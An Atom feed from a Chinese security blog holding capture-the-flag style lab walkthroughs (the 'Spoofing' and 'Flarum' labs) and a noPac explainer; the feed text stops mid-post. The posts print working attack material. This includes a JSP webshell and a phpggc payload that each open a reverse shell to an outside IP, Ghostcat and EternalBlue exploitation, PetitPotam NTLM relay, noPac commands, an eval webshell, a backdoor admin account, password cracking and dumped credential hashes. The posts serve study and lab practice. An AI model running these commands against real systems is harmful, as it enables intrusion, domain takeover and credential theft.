<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-10-25T13:35:53.272Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>春秋云镜-Spoofing</title>
    <link href="https://ke1nys.github.io/posts/ac5e4dda.html"/>
    <id>https://ke1nys.github.io/posts/ac5e4dda.html</id>
    <published>2023-10-25T11:08:02.000Z</published>
    <updated>2023-10-25T13:35:53.272Z</updated>
    
    <content type="html"><![CDATA[<p>先用fscan扫一下</p><p><img src="../images/image-20231025193232597.png" alt="image-20231025193232597"></p><p>就只扫到一个8080  8009端口和一个后台管理系统 </p><p><img src="../images/image-20231025193313805.png" alt="image-20231025193313805"></p><p>其实搜一下就会发现这是个tomcat   访问8080端口的  发现是个纯静态网页  没啥用  直接开扫目录</p><p><img src="../images/image-20231025193500422.png" alt="image-20231025193500422"></p><p><img src="../images/image-20231025193843475.png" alt="image-20231025193843475"></p><p>访问docs目录</p><p><img src="../images/image-20231025193919376.png" alt="image-20231025193919376"></p><p>有洞  直接去找poc来打</p><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.99.248.175:8080/ 8009  /WEB-INF/web.xml read</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025194055367.png" alt="image-20231025194055367"></p><p>发现有个UploadServlet路由  访问并且上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传文件</p><p><img src="../images/image-20231025194249510.png" alt="image-20231025194249510"></p><p>这个上传路径就是关键了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/95e3563074ba300f4e3f6a806d775b2c/20231025074306680.txt</span><br></pre></td></tr></table></figure><p>然后用上面的工具直接来打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.99.248.175:8080/ 8009 /upload/95e3563074ba300f4e3f6a806d775b2c/20231025074306680.txt   eval</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025194459228.png" alt="image-20231025194459228"></p><p>root权限直接拿flag就行了</p><p><img src="../images/image-20231025194609005.png" alt="image-20231025194609005"></p><p>然后收集信息  挂代理扫内网了</p><p><img src="../images/image-20231025194647224.png" alt="image-20231025194647224"></p><p><img src="../images/image-20231025195054731.png" alt="image-20231025195054731"></p><p>信息收集一下  然后整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.11.76  getshell机器</span><br><span class="line"></span><br><span class="line">172.22.11.6  域控机器 DC  DC XIAORANG\XIAORANG-DC</span><br><span class="line"> </span><br><span class="line">172.22.11.26  XIAORANG\XR-LCM3AE8B</span><br><span class="line"></span><br><span class="line">172.22.11.45   MS17-010   XR-DESKTOP.xiaorang.lab  </span><br></pre></td></tr></table></figure><p>有个MS17  直接打就行了   (这里建议用本地msf打  不然会报错  原因是啥我也不知道)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 172.22.11.45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025195542199.png" alt="image-20231025195542199"></p><p><img src="../images/image-20231025200113679.png" alt="image-20231025200113679"></p><p>然后直接导出本地hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XR-DESKTOP$  XIAORANG  0e1f6735dcf951891dbf20a4f0097423  4001c14de86e59f69085d140df5fada9ed2c19ca</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yangmei      xrihGHgoNZQ  //获取到了有个明文和hash密码</span><br></pre></td></tr></table></figure><p>yangmei这个用户可以rdp到ms17这个主机上   跑个sharphound没发现啥有用的信息  于是回到这个题目本身  发现给了个提示 WebClient</p><p><img src="../images/image-20231025201301198.png" alt="image-20231025201301198"></p><p><strong>(这就是为啥不直接打rbcd的原因  不能创建机器账户是其一  并且也不知道yangmei用户是否有写属性的)</strong></p><p>扫描WebClient</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav</span><br></pre></td></tr></table></figure><p>只有26的这台机器存在<code>Webclient</code>服务</p><p><img src="../images/image-20231025202543946.png" alt="image-20231025202543946"></p><p><strong><img src="../images/image-20231025201701199.png" alt="image-20231025201701199"></strong></p><p><strong>默认情况下, WebClient 仅对本地内部网 (Local Intranet) 或受信任的站点 (Trusted Sites) 列表中的目标自动使用当前用户凭据进行 NTLM 认证</strong></p><p>扫描一下Petitpotam  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025201745549.png" alt="image-20231025201745549"></p><p>在奇安信的一篇文章中  总结了所有域强制认证的所有方法</p><p><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a></p><p>这下子是三台机器存在Petitpotam这个服务了</p><p>以下是参考<a href="https://www.cnblogs.com/backlion/p/17187375.html">https://www.cnblogs.com/backlion/p/17187375.html</a>  这篇文章来进行编写的</p><p>这两个组合起来就会让人联想到一个攻击手法</p><p><strong>无ADCS + Petitpotam + ntlm中继打法</strong></p><p>攻击链：用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD)</p><ul><li><p>条件 — 目标机器需要开启webclient服务</p></li><li><p>中继攻击手法</p></li></ul><blockquote><ul><li>实战中的中继打法只需要停掉80占用服务，开启端口转发（portfwd，CS在后续版本中添加了rportfwd_local，直接转发到客户端本地）</li><li>本次演示类似实战的打法，不选择把impacket丢到入口ubuntu上面这种操作</li></ul></blockquote><ol><li>中继攻击环境配置: 端口转发 + 代理<br>我们目前需要把服务器的80，转发到客户端本地的80</li></ol><p>直接上命令 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.248.175  -D 101.42.39.110:7777 -R \*:79:127.0.0.1:80</span><br><span class="line"></span><br><span class="line">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</span><br></pre></td></tr></table></figure><p>记得写公钥到getshell主机上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#自己的机器上</span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">#弹的shell</span><br><span class="line">echo &quot;~/.ssh/id_rsa.pub的内容&quot; &gt; /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.248.175</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025203310301.png" alt="image-20231025203310301"></p><p><img src="../images/image-20231025203418194.png" alt="image-20231025203418194"></p><p><img src="../images/image-20231025203405384.png" alt="image-20231025203405384"></p><p>说明了成功将端口转发到本地了  我们直接使用本地来替代172.22.11.76这台机器</p><p>接着本地开启开启ntlmrelayx，利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD，接着使用<a href="https://github.com/topotam/PetitPotam">Petitpotam</a>触发XR-LCM3AE8B认证到172.22.11.76</p><p><strong>(用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD))</strong></p><p>上面加黑的就是原理了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user &#x27;xr-desktop$&#x27; --delegate-access</span><br><span class="line">proxychains python3 PetitPotam.py -u yangmei -p &#x27;xrihGHgoNZQ&#x27; -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025204332096.png" alt="image-20231025204332096"></p><p><img src="../images/image-20231025204500404.png" alt="image-20231025204500404"></p><p><img src="../images/image-20231025204511857.png" alt="image-20231025204511857"></p><p><strong>成功使用PetitPotam这个方法   强制使26这台带有webclient的机器去访问 我们的中继服务(并且获取到的权限还将26这台机器的msDS-AllowedToActOnBehalfOfOtherIdentity 属性修改成45这台机器上  这样就变成了RBCD攻击)</strong></p><p>接下来申请ST直接去访问26这台机器就行了  <strong>(这里的hash值是之前在打上面45这台机器的时候导出的)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :0e1f6735dcf951891dbf20a4f0097423  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">sudo vim /etc/hosts#把XR-LCM3AE8B.xiaorang.lab的ip加到hosts里</span><br></pre></td></tr></table></figure><p>然后无密码连接上去就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025205200436.png" alt="image-20231025205200436"></p><p>这样的话就拿下第三台机器了</p><p><img src="../images/image-20231025205303611.png" alt="image-20231025205303611"></p><p>拿下第三个flag</p><p>这里的话新创建个用户上去  mimikatz跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p>这里建议直接用管理员启动  这样方便点</p><p><img src="../images/image-20231025205857192.png" alt="image-20231025205857192"></p><p>抓取本地hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhanghui      1232126b24cdf8c9bd2f788a9d7c7ed1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025205951016.png" alt="image-20231025205951016"></p><p><img src="../images/image-20231025213428205.png" alt="image-20231025213428205"></p><p><strong>(这里不直接显示出来  不过不影响 这里就是说zhanghui是MA_Admin组的)</strong></p><p>这里的话说zhanghui是MA_Admin组，对computer能够创建对象，能向域中添加机器账户，所以能打noPac</p><p>(很是抽象)—————————————-noPac的话我写了一篇文章  感兴趣的话可以去搜来看看</p><p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><p><strong>(记得就是把整个文件下载下来运行  不要单拿nopac.py出来运行  否则会报错)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes &#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025210806151.png" alt="image-20231025210806151"></p><p>属实一步到位   直接就新加用户然后改名打noPac</p><p>和rbcd是有点像的</p><p><img src="../images/image-20231025211006556.png" alt="image-20231025211006556"></p><p>这里的话不用那个新添加计算机也行  因为我们本来域中就有机器账户  并且我们还有权限来修改其属性  所以直接用<code>XR-DESKTOP.xiaorang.lab</code>这台机器就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/&#x27;XR-DESKTOP$&#x27; -hashes &#x27;:0e1f6735dcf951891dbf20a4f0097423&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name &#x27;XR-DESKTOP$&#x27; -old-hash &#x27;:0e1f6735dcf951891dbf20a4f0097423&#x27; -use-ldap -shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025211319801.png" alt="image-20231025211319801"></p><p><img src="../images/image-20231025211533457.png" alt="image-20231025211533457"></p><p>题目给的提示</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先用fscan扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231025193232597.png&quot; alt=&quot;image-20231025193232597&quot;&gt;&lt;/p&gt;
&lt;p&gt;就只扫到一个8080  8009端口和一个后台管理系统 &lt;/p&gt;</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-NoPac</title>
    <link href="https://ke1nys.github.io/posts/4997e8ba.html"/>
    <id>https://ke1nys.github.io/posts/4997e8ba.html</id>
    <published>2023-10-24T10:07:42.000Z</published>
    <updated>2023-10-24T12:38:20.172Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/-meditation-/articles/16619406.html">参考文章1</a>   <a href="https://blog.csdn.net/weixin_44747030/article/details/127158385">参考文章2</a></p><p>这里是准备讲讲PAC的一个攻击手法 NoPac</p><p>这里是在打春秋云镜的<code>Spoofing</code>遇到的  刚好借此机会来学习一下</p><p><strong>(这里只讲原理  不操作  因为懒得搭建环境…………)</strong></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>首先PAC呢  在我们学习这个<a href="https://ke1nys.github.io/posts/1bedf17b.html#%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B">kerberos </a>协议的时候就遇到这个  就是在我们申请TGT票据的时候生成的</p><p>因为我们在申请TGS票据的时候  是不会验证我们是否有权限来访问该服务的  验证是否有权限来访问该服务的时候在我们拿着ST去申请访问的时候  验证的话就是靠我们TGS票据里的PAC</p><p>(TGS里的PAC是从TGT票据中复制过来的)</p><h2 id="漏洞及漏洞原理"><a href="#漏洞及漏洞原理" class="headerlink" title="漏洞及漏洞原理"></a>漏洞及漏洞原理</h2><p>CVE-2021-42278 &amp; CVE-2021-42287</p><ul><li><p>CVE-2021-42278， 机器用户应当是computer$的形式，但是实际并没有验证机器账号是否有$。导致机器用户名可以被模拟冒用。</p></li><li><p>CVE-2021-42287，Kerberos在处理UserName字段时，如果找不到 UserName 的话，KDC会继续查找 UserName$，如果还是查找不到的话，KDC会继续查找altSecurityIdentities属性的值的⽤户。正是因为这个处理逻辑，导致了漏洞的产⽣。触发这个点有两种方式</p><ul><li>跨域请求：跨域请求时，⽬标域活动⽬录数据库是找不到其他域的⽤户的，因此会⾛进这个 处理UserName的逻辑。</li><li>修改saMAccountName属性：在当前域，可以通过修改saMAccountName属性让KDC找不到⽤户，然后⾛进这个处理UserName的逻辑。</li></ul><p>但是这还是不够，仅仅让KDC⾛进这个处理UserName的逻辑，还不能伪造⾼权限。因为票据中代表⽤户身份权限是数据块是PAC。⽽TGT认购权证中的PAC是根据预认证身份信息⽣成的，这个我们⽆法伪造。因此得想办法在ST服务票据中进⾏伪造。⽽正常的ST服务票据中的PAC是直接拷⻉TGT认购权证中的。因此，得想办法让KDC在TGS-REP的时候重新⽣成PAC，⽽不是拷⻉TGT票据中的PAC。这⾥也有两种⽅式：</p><ul><li>S4U2Self请求：KDC在处理S4U2Self类型的TGS-REQ请求时，PAC是重新⽣成的。</li><li>跨域⽆PAC的TGT票据进⾏TGS请求：KDC在处理跨域的TGS-REQ请求时，如果携带的TGT认购权证中没有PAC，PAC会重新⽣成。</li></ul></li></ul><p><strong>(这里为什么S4U2Self请求是会重新生成PAC的原因)</strong></p><blockquote><p>S4U2Self  是替代用户去请求TGS票据  不是代表客户端去请求票据</p></blockquote><h2 id="纸上操作"><a href="#纸上操作" class="headerlink" title="纸上操作"></a>纸上操作</h2><ul><li>域机器账户  PC1$</li><li>域控 DC$</li></ul><p>先简单讲一下流程  就是我们先去修改saMAccountName为DC  然后就去请求TGT票据  然后再修改回PC1$  然后使用S4U2Self去申请TGS票据  在KDC验证PAC的时候  因为找不到DC用户  然后就会去找DC$用户  然后找到了  就说明我们用的是域控机器的TGT票据  然后就可以伪造域管去获取TGS了 <strong>(并且重新生了PAC  ———-   是域管的)</strong></p><p><strong>(注意一下  替代用户去申请的TGS票据的时候  替代的用户一定是存在且允许的  不然会失败)</strong></p><p><strong>(下面用的命令可能有点乱  但是咱重要看的是思路  理解后稍微改改就行了)</strong></p><ul><li>第一步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name &#x27;9z1nc$&#x27; -new-name &#x27;OWA2010CN-god&#x27; -dc-ip 192.168.3.21 &#x27;god.com/mary:admin!@#45&#x27;</span><br><span class="line"></span><br><span class="line">//改名</span><br></pre></td></tr></table></figure><ul><li>第二步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:&quot;r-dc&quot; /password:&quot;1qaz@WSX&quot; /domain:&quot;hacker.lab&quot; /dc:&quot;r-dc.hacker.lab&quot; /nowrap</span><br><span class="line"></span><br><span class="line">//申请TGT票据</span><br></pre></td></tr></table></figure><ul><li>第三步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name &#x27;OWA2010CN-God&#x27; -new-name &#x27;9z1nc$&#x27; -dc-ip 192.168.3.21 &#x27;god.com/mary:admin!@#45&#x27;</span><br><span class="line"></span><br><span class="line">//该回原来的名字</span><br></pre></td></tr></table></figure><ul><li>第四步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;administrator&quot; /altservice:&quot;ldap/r-dc.hacker.lab&quot; /dc:&quot;r-dc.hacker.lab&quot; /ptt /ticket:base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用s4u协议去申请TGS票据</span><br></pre></td></tr></table></figure><p><strong>然后最后就成功了  这样的话我们就可以拥有域管的权限了</strong></p><p>一般来说noPAC.py工具的话 就可以一步到位了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/-meditation-/articles/16619406.html&quot;&gt;参考文章1&lt;/a&gt;   &lt;a href=&quot;https://blog.csdn.net/weixin_44747030/article/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Flarum</title>
    <link href="https://ke1nys.github.io/posts/dab11f8.html"/>
    <id>https://ke1nys.github.io/posts/dab11f8.html</id>
    <published>2023-10-24T07:30:16.000Z</published>
    <updated>2023-10-24T08:40:09.204Z</updated>
    
    <content type="html"><![CDATA[<p>fscan先扫一波</p><p><img src="../images/image-20231024153826631.png" alt="image-20231024153826631"></p><p>一个80端口</p><p><img src="../images/image-20231024153856241.png" alt="image-20231024153856241"></p><p>这个登录的话是不需要进行验证码或者别的验证东西  所以我们可以进行爆破·</p><p>用那个rockyou.txt就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator::1chris</span><br></pre></td></tr></table></figure><p>爆破出密码后进行登录后台</p><p><img src="../images/image-20231024154244192.png" alt="image-20231024154244192"></p><p>这个cms的话其实就是跟题目给的名字是一样的  <code>Flarum</code></p><p>直接去找洞就行了</p><p>这里用p牛的一篇文章来参考</p><p><a href="https://tttang.com/archive/1714/#toc_0x02-css">https://tttang.com/archive/1714/#toc_0x02-css</a></p><p>先下载一个<code>phpggc</code>  <a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a>  就是php版的yso</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -p tar -b Monolog/RCE6 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 0&gt;&amp;1&#x27;&quot;</span><br></pre></td></tr></table></figure><p>编译成功后会生成一大堆base64代码，复制过来，在后台修改css那里替换下面代码的xxx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import (inline) &#x27;data:text/css;base64,xxx&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024154602503.png" alt="image-20231024154602503"></p><p>保存之后 开启监听  并且重新写一个css进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.test &#123;</span><br><span class="line">    content: data-uri(&#x27;phar://./assets/forum.css&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024154735633.png" alt="image-20231024154735633"></p><p><img src="../images/image-20231024154752600.png" alt="image-20231024154752600"></p><p>低权限  估计要提权拿flag了  先弹个马到msf上</p><p><strong>(这里用的是capabilities   这个的话就是将权限更加细分了而已  不在一股脑除了root就是www-data)</strong></p><p>查看cap权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024155716923.png" alt="image-20231024155716923"></p><p>这个openssl我们可以利用  (flag文件位置已知)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -in &quot;/root/flag/flag01.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024160235538.png" alt="image-20231024160235538"></p><p>接下来就是扫内网挂代理了</p><p><img src="../images/image-20231024160255260.png" alt="image-20231024160255260"></p><p><img src="../images/image-20231024160531332.png" alt="image-20231024160531332"></p><p>整理信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.60.52    getshell </span><br><span class="line"></span><br><span class="line">172.22.60.42        3389   XIAORANG\FILESERVER   (文件服务)</span><br><span class="line"></span><br><span class="line">172.22.60.8          3389   DC XIAORANG\DC</span><br><span class="line"></span><br><span class="line">172.22.60.15          3389  XIAORANG\PC1</span><br></pre></td></tr></table></figure><p>收集完信息后  没有思路了  回去到刚刚获取到的shell的主机上看看  有没有数据库或者啥重要的信息</p><p><img src="../images/image-20231024161012031.png" alt="image-20231024161012031"></p><p>在网站目录下复现一个config.php的配置文件  里面有数据库  但是只能本地连接  我们上传个<code>adminer.php</code>上去</p><p>写个马用蚁剑传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024161321915.png" alt="image-20231024161321915"></p><p>试了一下 发现只有assets是我们有权限写文件进去的</p><p><img src="../images/image-20231024161532024.png" alt="image-20231024161532024"></p><p><img src="../images/image-20231024161633166.png" alt="image-20231024161633166"></p><p>我们将这个表里的内容全部以csv的格式导出  然后execl打开  然后我们就能提取到email这个列的所有数据了</p><p>这个盲猜一手 AS-REP Roasting</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetNPUsers -dc-ip 172.22.60.8  xiaorang.lab/ -usersfile flarum_users.txt</span><br><span class="line"></span><br><span class="line">//这里写域控ip是因为申请tgt票据的时候我们是像域控申请的</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024162034987.png" alt="image-20231024162034987"></p><p>这里返回的hash值是session_key的  我们能爆破出用户的密码是因为这个session_key是由用户的密码hash值进行加密的</p><p>然后使用hashcat进行爆破(只爆破出了一个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 --force 1.txt rockyou.txt</span><br></pre></td></tr></table></figure><p><code>wangyun@XIAORANG.LAB::Adm12geC</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.60.15 -u wangyun -p Adm12geC -d xiaorang.lab</span><br><span class="line"></span><br><span class="line">//测试一下密码是否可靠</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024162317361.png" alt="image-20231024162317361"></p><p>并且这个ip还开了3389端口  尝试rdp</p><p><img src="../images/image-20231024162525165.png" alt="image-20231024162525165"></p><p>卓面上有个xshell 但是只能知道用户名  却不知道密码</p><p>使用<a href="https://github.com/JDArmy/SharpXDecrypt/">https://github.com/JDArmy/SharpXDecrypt/</a> 这个工具  可以帮助我们获取到这个zhangxin用户的密码</p><p><img src="../images/image-20231024162715933.png" alt="image-20231024162715933"></p><p>获取到了该密码</p><p><img src="../images/image-20231024162753044.png" alt="image-20231024162753044"></p><p>在域内</p><p><img src="../images/image-20231024162846936.png" alt="image-20231024162846936"></p><p>并且还是*Account Operators这个组的成员 </p><p><img src="../images/image-20231024162919468.png" alt="image-20231024162919468"></p><p>还是这个电脑的用户</p><p>用sharphound.exe跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -c all -ns 172.22.60.8 --zip --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024163117214.png" alt="image-20231024163117214"></p><p>这下思路就清晰了 </p><p>这里可以发现zhangxin用户属于<strong>Acount Operators</strong>, 